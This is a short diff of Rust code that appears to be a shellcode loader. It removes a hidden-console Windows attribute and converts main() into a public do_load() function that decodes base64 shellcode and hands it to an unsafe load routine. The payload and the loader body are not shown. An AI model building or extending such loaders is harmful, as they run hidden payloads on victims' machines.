@@ -1,10 +1,4 @@
-#![cfg_attr(
-    all(
-      target_os = "windows",
-      feature = "no_console",
-    ),
-    windows_subsystem = "windows"
-  )]  
+
 
 #[macro_export]
 macro_rules! debug {
@@ -47,8 +41,8 @@ fn get_shell_code_base64() -> Vec<u8> {
 // }
 
 
-fn main() {
-    
+pub fn do_load()
+{
     let shell_code = get_shell_code_base64();
     //let shell_code = get_shell_code();
     debug!("[+] Shellcode loaded !");
@@ -59,7 +53,6 @@ fn main() {
         }
     }
 }
-
 
 fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
     unsafe {
